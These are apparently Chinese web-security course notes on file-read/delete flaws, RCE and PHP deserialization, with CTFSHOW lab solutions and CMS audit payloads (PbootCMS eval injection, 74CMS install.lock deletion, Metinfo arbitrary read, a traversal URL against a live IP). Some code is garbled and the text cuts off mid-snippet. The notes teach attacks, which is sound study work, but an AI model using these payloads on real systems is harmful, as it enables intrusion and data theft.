<p><strong>黑盒分析-下载读取-下载资源URL参数</strong></p>
<p>通过百度可知该框架下数据库连接文件的默认路径，构造连接进行下载<br><a target="_blank" rel="noopener" href="http://67.202.70.133/files/readfile.php?file=%E2%80%A6/configuration.php">http://67.202.70.133/files/readfile.php?file=…/configuration.php</a></p>
<h4 id="白盒审计："><a href="#白盒审计：" class="headerlink" title="#白盒审计："></a>#白盒审计：</h4><p>1、文件下载<br>流程功能点抓包寻代码文件寻变量控制构造测试<br>Payload:softadd&#x3D;d:&#x2F;1.txt softadd2&#x3D;d:&#x2F;1.txt<br>2、文件删除：74CMS-配合删除重装<br>流程特定函数搜索寻发调用-构造Payload测试<br>Payload:&#x2F;admin&#x2F;admin_article.php?act&#x3D;del_img&amp;img&#x3D;…&#x2F;…&#x2F;data&#x2F;install.lock<br>3、文件读取：Metlnfo-任意读取<br>流程。特定函数援索寻融发调用-构造Payload测试<br>Payload:&#x2F;include&#x2F;thumb.php?dir&#x3D;http…\config\config_db.php</p>
<h4 id="黑盒探针"><a href="#黑盒探针" class="headerlink" title="#黑盒探针"></a>#黑盒探针</h4><p>1、URL参数名及参数值分析：<br>参数名：英文对应翻译<br>参数值：目录或文件名<br>2、功能点自行修改后分析：<br>文件下载，册除，读取等</p>
<h1 id="第44天：WEB攻防-通用漏洞-RCE-代码执行-命令执行-多层面检测利用"><a href="#第44天：WEB攻防-通用漏洞-RCE-代码执行-命令执行-多层面检测利用" class="headerlink" title="第44天：WEB攻防-通用漏洞&amp;RCE&amp;代码执行&amp;命令执行&amp;多层面检测利用"></a>第44天：WEB攻防-通用漏洞&amp;RCE&amp;代码执行&amp;命令执行&amp;多层面检测利用</h1><h4 id="知识点：-24"><a href="#知识点：-24" class="headerlink" title="知识点："></a>知识点：</h4><p>1、RCE执行-代码执行&amp;命令</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>);   <span class="comment">//代码执行</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;ver&#x27;</span>);     <span class="comment">//命令执行    这两种要区分</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>命令执行指的是攻击者通过在 Web应用程序中注入恶意命令，从而执行非法操作。攻击者通常会利用可编辑的参数或表单字段，在注入时输入一些包含系统命令的字符，使得 Web 程序把这些字符作为命令执行。成功的攻击可以导致 Web 服务器受到控制，甚至可以窃取敏感信息或破坏系统。<br>代码执行指的是攻击者通过在 Web应用程序中注入恶意代码，从而让其在服务器端执行。攻击者通常会利用可编辑的参数或表单字段，在注入时输入一些包含恶意脚本的字符，使得 Web程序在解析时把这些字符直接当做代码执行。成功的攻击可以导致 Web 服务器受到控制，甚至可以窃取敏感信息或破坏系统。</p>
</blockquote>
<p>2、CTF考点-漏洞配合&amp;绕过手法<br>3、利用审计-CMS框架&amp;中间件等</p>
<h4 id="详细点：-9"><a href="#详细点：-9" class="headerlink" title="#详细点："></a>#详细点：</h4><p>1.为什么会产生此类安全问题<br>2此类安全问题探针利用及危害<br>3.此类安全问题在CTF即CMS分析<br>漏洞场景：代码会调用自身的脚本代码执行，也会调用系统命令执行<br>漏洞区别：脚本语言&amp;操作系统(php&#x2F;java&#x2F;python&#x2F;js&amp;windows&#x2F;&#x2F;linux&#x2F;mac)<br>漏洞对象：WEB源码&amp;中间件&amp;其他环境（见漏洞详情对象）<br>漏洞危害：直接权限丢失，可执行任意却本代码或系统命令</p>
<h4 id="演示案例：-21"><a href="#演示案例：-21" class="headerlink" title="演示案例："></a>演示案例：</h4><p>RCE-原理&amp;探针&amp;利用&amp;危害等<br>CTF-29-39-RCE代码命令执行<br>CMS-PbootCMS审计-RCE执行<br>层面-探针-语言&amp;CMS&amp;中间件等</p>
<h4 id="RCE-原理-探针-利用-危害等"><a href="#RCE-原理-探针-利用-危害等" class="headerlink" title="#RCE-原理&amp;探针&amp;利用&amp;危害等"></a>#RCE-原理&amp;探针&amp;利用&amp;危害等</h4><p>举例：</p>
<?php eval代码执行 eval(phpinfo（） //system命令执行 system(ipconfig'); ?>
<p>-RCE代码执行：引用脚本代码解析执行<br>RCE命令执行：脚本调用操作系统命令<br>漏洞函数：</p>
<blockquote>
<p>1.PHP: eval（）.assert()、preg_replace()、call_user_func（)、all_user_func_array()以及aray_map()等<br>system、shell_exec、popen、passthru、proc_open等<br>2.Python eval exec subprocess os.system commands<br>3.Java: Java中没有类似php中eval函数这种亘接可以将字符玉转化为代码执行的函数， 但是有反射机制，并且有各种基于反射机制的表达式擎，如：OGNL、SpEL、MVEL等</p>
</blockquote>
<p><strong>CTF-29-39-RCE代码命令执行</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">29关</span><br><span class="line">思路：看代码过滤了flag大小写格式，使用通配符绕过 ?c=system(‘tac fla*.php’);</span><br><span class="line"></span><br><span class="line">30关</span><br><span class="line">思路：看代码除了过滤flag还过滤了system、php的大小写，使用shell_exec绕过 /?c=echo shell_exec(‘tac fla*’);</span><br><span class="line"></span><br><span class="line">‘cp fla*.ph* 2.txt’:</span><br><span class="line">echo shell exec(‘tac fla*.ph*’);</span><br></pre></td></tr></table></figure>

<p>31-参数逃逸</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eval($GET[1]):&amp;1=system(‘tac flag.php’);</span><br><span class="line">思路：再上一关的基础上增加过滤shell_exec cat sort等函数，这时候可以用参数逃逸，创建新参数然后让新参数执行命令</span><br></pre></td></tr></table></figure>

<p>32~36-配合包含&amp;伪协议</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span><span class="variable">$_</span> GET[a]<span class="meta">?&gt;</span>&amp;a=data:<span class="comment">//text/plain,&lt;?=system(&#x27;tac flag.php&#x27;);?&gt;</span></span><br><span class="line"><span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;a=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br><span class="line">思路：过滤了；分号致使语句不能结束执行，使用<span class="keyword">include</span> <span class="meta">?&gt;</span>结束语句然后利用文件包含中的伪协议进行读取</span><br></pre></td></tr></table></figure>

<p>37~39-包含&amp;伪协议&amp;通配符</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="comment">//text/plain,&lt;?=system(&#x27;tac fla);?&gt;</span></span><br><span class="line">php:<span class="comment">//input post&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span></span><br></pre></td></tr></table></figure>

<p>思路：直接利用文件包含，同时使用通配符绕过php flag过滤</p>
<h4 id="代码审计-PbootCMS-RCE代码执行"><a href="#代码审计-PbootCMS-RCE代码执行" class="headerlink" title="#代码审计-PbootCMS-RCE代码执行"></a>#代码审计-PbootCMS-RCE代码执行</h4><p>流程：搜索特定函数-&gt;parserlfLabe-&gt;parserCommom-&gt;About&amp;Content-&gt;构造<br>AboutController:(pboot:if(eval($_POST[1])))&#x2F;pbootif)<br>ContentController:&#x2F;index.php&#x2F;Content&#x2F;2?keyword&#x3D;(pboot:if(eval(S_REQUEST[1]))😕&#x2F;)))))<br>(&#x2F;pbootin&amp;1&#x3D;phpinto（）;</p>
<h4 id="层面-探针-语言-CMS框架-中间件"><a href="#层面-探针-语言-CMS框架-中间件" class="headerlink" title="#层面-探针-语言&amp;CMS框架&amp;中间件"></a>#层面-探针-语言&amp;CMS框架&amp;中间件</h4><p><a target="_blank" rel="noopener" href="http://vulfocus.io/">http://vulfocus.io/</a> Shiro weblogic<br>使用工具快速拿下权限</p>
<h1 id="第45天：WEB攻防-通用漏洞-PHP反序列化-POP链构造-魔术方法-原生类"><a href="#第45天：WEB攻防-通用漏洞-PHP反序列化-POP链构造-魔术方法-原生类" class="headerlink" title="第45天：WEB攻防-通用漏洞&amp;PHP反序列化&amp;POP链构造&amp;魔术方法&amp;原生类"></a>第45天：WEB攻防-通用漏洞&amp;PHP反序列化&amp;POP链构造&amp;魔术方法&amp;原生类</h1><h4 id="知识点：-25"><a href="#知识点：-25" class="headerlink" title="知识点："></a>知识点：</h4><p>1、什么是反序列化操作？格式转换<br>2、为什么会出现安全漏洞？魔术方法<br>3、反序列化漏洞如何发现？对象逻辑<br>4、反序列化漏洞如何利用？-POP链构造<br>补充：反序列化利用大概分类三类<br>魔术方法的调用逻辑如触发条件<br>语言原生类的调用逻辑如SoapClient<br>-语言自身的安全缺陷如CVE-2016-7124</p>
<h4 id="反序列化课程点："><a href="#反序列化课程点：" class="headerlink" title="#反序列化课程点："></a>#反序列化课程点：</h4><p>-PHP&amp;Java&amp;Python</p>
<blockquote>
<p>这边注意的是，反序列化漏洞在CTF中经常会考到，而且实战面试也是一大考点</p>
</blockquote>
<p>序列化：对象转换为数组或字符串等格式<br>反序列化：将数组或字符串等格式转换成对象<br>serialize() &#x2F;&#x2F;将一个对象转换成一个字符串<br>unserialize()&#x2F;&#x2F;将字符串还原成一个对象</p>
<h4 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="#PHP反序列化漏洞"></a>#PHP反序列化漏洞</h4><p>原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而<br>导致代码执行，SQL注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些<br>魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。</p>
<h4 id="魔术方法利用点分析："><a href="#魔术方法利用点分析：" class="headerlink" title="#魔术方法利用点分析："></a>#魔术方法利用点分析：</h4><p>触发：unserialize函数的变量可控，文件中存在可利用的类，类中有魔术方法：</p>
<p>魔术方法是PHP反序列化中寻找漏洞的重点之一</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>():<span class="comment">//构造函数，当对象new的时候会自动调用</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>():<span class="comment">//析构函数当对象被销毁时会被自动调用</span></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>():<span class="comment">//unserialize()时会被自动调用</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>(): <span class="comment">//当尝试以调用函数的方法调用一个对象时，会被自动调用</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>(): <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatci</span>(): <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>(): <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>(): <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>(): <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>(): <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>(): <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>(): <span class="comment">//serialize()函数会检查类中是否存在一个魔术方法__sleep() 如果存在，该方法会被优先调用</span></span><br></pre></td></tr></table></figure>

<p><strong>演示序列化和反序列操作，将对象转化成数组或字符串</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//序列化&amp;反序列化</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demotest</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;xiaodi&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$sex</span>=<span class="string">&#x27;man&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&#x27;29&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$example</span>=<span class="keyword">new</span> <span class="title function_ invoke__">demotest</span>();</span><br><span class="line"><span class="variable">$s</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$example</span>);<span class="comment">//序列化</span></span><br><span class="line"><span class="variable">$u</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>);<span class="comment">//反序列化</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$u</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//O:8:&quot;demotest&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;xiaodi&quot;;s:3:&quot;sex&quot;;s:3:&quot;man&quot;;s:3:&quot;age&quot;;s:2:&quot;29&quot;;&#125;</span></span><br><span class="line"><span class="comment">//object(demotest)#2 (3) &#123; [&quot;name&quot;]=&gt; string(6) &quot;xiaodi&quot; [&quot;sex&quot;]=&gt; string(3) &quot;man&quot; [&quot;age&quot;]=&gt; string(2) &quot;29&quot; &#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>演示创建对象即可触发__construct魔术方法，销毁对象触发__destruct，把类当作字符串使用时触发__toString()</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//安全问题</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$var</span>=<span class="string">&#x27;echo test&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;x&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;__construct&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;__toString&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//无需函数，创建对象触发魔术方法</span></span><br><span class="line"><span class="comment">//$a=new A();//触发__construct</span></span><br><span class="line"><span class="comment">//$a-&gt;test();//触发test</span></span><br><span class="line"><span class="comment">//echo $a;//触发__toString</span></span><br><span class="line"><span class="comment">//触发__destruct</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$t</span>=<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:1:&quot;A&quot;:1:&#123;s:3:&quot;var&quot;;s:9:&quot;echo test&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$t</span>-&gt;<span class="title function_ invoke__">test</span>();</span><br></pre></td></tr></table></figure>

<p><strong>此处创建新对象会自动先输出xiaodisec然后执行ipconfig，此处传参将参数反序列化时会自动触发__destruct()执行ipconfig命令</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//漏洞出现</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ipconfig&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;xiaodisec&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//函数引用，无对象创建触发魔术方法</span></span><br><span class="line"><span class="comment">//?x=O:1:&quot;B&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;ver&quot;;&#125;</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[x]);</span><br><span class="line"><span class="comment">//$b=new b();</span></span><br><span class="line"><span class="comment">//echo serialize($b);</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">此处算是正式利用反序列化触发<span class="title function_ invoke__">__destruct</span>(),执行系统命令ipconfig，在函数引用时，使用了反序列化漏洞的方式来构造了一个恶意对象，</span><br><span class="line">由于在反序列化过程中会触发 <span class="title function_ invoke__">__destruct</span>() 方法的执行，因此可以通过构造恶意对象来执行任意系统命令，导致严重的安全问题。</span><br><span class="line">具体来说，当我们通过访问链接 ?c=O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;cmd&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;ver&quot;</span>;&#125; 来触发反序列化操作时，</span><br><span class="line">会将该字符串反序列化为一个对象，并调用其中的 <span class="title function_ invoke__">__destruct</span>() 方法。</span><br><span class="line">由于 <span class="variable">$cmd</span> 成员变量的值被设置为字符串 <span class="string">&quot;ipconfig&quot;</span>，因此在调用 <span class="title function_ invoke__">__destruct</span>() 方法时，会执行系统命令 <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd)，</span><br><span class="line">从而执行 ipconfig 命令并输出相关信息。</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&#x27;ipconfig&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;xiaodisec&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//函数引用，无对象创建触发魔术方法自定义变量</span></span><br><span class="line"><span class="comment">//?c=O:1:&quot;C&quot;:1:&#123;s:3:&quot;cmd&quot;;s:3:&quot;ver&quot;;&#125;</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[c]);</span><br></pre></td></tr></table></figure>

<h4 id="演示案例：-22"><a href="#演示案例：-22" class="headerlink" title="演示案例："></a>演示案例：</h4><p>反序列化魔术方法&amp;漏洞引发&amp;变量修改等<br>CTFSHOW-关卡254到260-原生类&amp;POP构造<br>CMS代码审计-Typecho)反序列化&amp;魔术方法逻辑</p>
<h4 id="CTFSHOW-关卡254-260原生类-POP构造"><a href="#CTFSHOW-关卡254-260原生类-POP构造" class="headerlink" title="#CTFSHOW-关卡254-260原生类&amp;POP构造"></a>#CTFSHOW-关卡254-260原生类&amp;POP构造</h4><h6 id="254对象引用执行逻辑"><a href="#254对象引用执行逻辑" class="headerlink" title="254对象引用执行逻辑"></a>254对象引用执行逻辑</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=xxxxx&amp;password=xxxxxx</span><br><span class="line">思路：从代码分析若想输出flag则需要isvip为真，而isvip为真需要调用方法login满足接收的参数usernam和password=xxxxx，则只需要通过get方式传入正确参数即可</span><br></pre></td></tr></table></figure>

<h6 id="255反序列化变量修改1"><a href="#255反序列化变量修改1" class="headerlink" title="255反序列化变量修改1"></a>255反序列化变量修改1</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Code</span><br><span class="line">publc ￥svip=<span class="literal">true</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctishowUserl</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">senalize</span>(<span class="variable">$a</span>));</span><br><span class="line">Get userame=xxxxoxxpassword=xxxxx</span><br><span class="line">Cookie:user=O3A113A%<span class="number">22</span>ctfShowUser223A363A7Bs%<span class="number">3</span>A8%<span class="number">3</span>A22usema</span><br><span class="line">me223BsG0A693A122xxxxx1223Bs3AB1 <span class="number">3</span>A122password%<span class="number">22</span>%<span class="number">3</span>Bs9 <span class="number">3</span>A6</span><br><span class="line"><span class="number">9</span>%<span class="number">3</span>A02200000.<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5,<span class="number">3</span>A622isVp%,<span class="number">22</span>%<span class="number">3</span>BD%<span class="number">3</span>A1%<span class="number">3</span>日%，<span class="number">7</span>D</span><br><span class="line">思路：同上关，需要将isvip确定为ture，但是代码中并无修改isvip的方法，此时需要通过构造pop链将isvip确定为ture，构造pop链的方法是创建一个新对象，并将对象通过序列化的方法输出出来（此时还需要将序列化后的对象进行url编码防止乱码的现象发生），然后将序列化编码后的对象通过修改数据包传参到cookie字段中的user变量，然后代码会通过反序列化的方式将isvip修改为ture，修改数据包时还需要通过get方式传参username和password进行登录验证（因为只有登录成功以后函数才会使得<span class="keyword">if</span>（<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>)）为真）。</span><br></pre></td></tr></table></figure>

<h6 id="256-反序列化参数修改2"><a href="#256-反序列化参数修改2" class="headerlink" title="256-反序列化参数修改2"></a>256-反序列化参数修改2</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Code</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;x&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;y&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">Sa=<span class="keyword">new</span> ctfShowUser（）.</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(Sa));</span><br><span class="line">GET.userame=x&amp;password=y</span><br><span class="line">COOKIE:user=<span class="number">0</span>%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>usern</span><br><span class="line">ame%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">22</span>x%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span> passw0rd%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A1%<span class="number">3</span>A</span><br><span class="line">%<span class="number">22</span>y%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>isVp%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br><span class="line">思路：分析代码，同上关需要满足username不等于password,同时username和password都等于xxxxxx，</span><br><span class="line">并且isvip为ture的情况下才会输出flag。则需要构造pop链，</span><br><span class="line">构造<span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;x&#x27;</span>;<span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;y&#x27;</span>;<span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;则传参username=x&amp;password=y,</span><br><span class="line">并且反序列化后使得<span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>)为真，isvip为ture。并且username不等于password。</span><br></pre></td></tr></table></figure>

<h6 id="257-反序列化参数修改-对象调用逻辑"><a href="#257-反序列化参数修改-对象调用逻辑" class="headerlink" title="257-反序列化参数修改&amp;对象调用逻辑"></a>257-反序列化参数修改&amp;对象调用逻辑</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$class</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">  	&#125;</span></span><br><span class="line"><span class="class">  &#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span>(</span></span><br><span class="line"><span class="class"><span class="title">private</span> $<span class="title">code</span>=&#x27;<span class="title">system</span>(&quot;<span class="title">cat</span> <span class="title">f</span>*&quot;);&#x27;;</span></span><br><span class="line"><span class="class">$<span class="title">b</span>=<span class="title">new</span> <span class="title">ctfshowUser</span>();</span></span><br><span class="line"><span class="class"><span 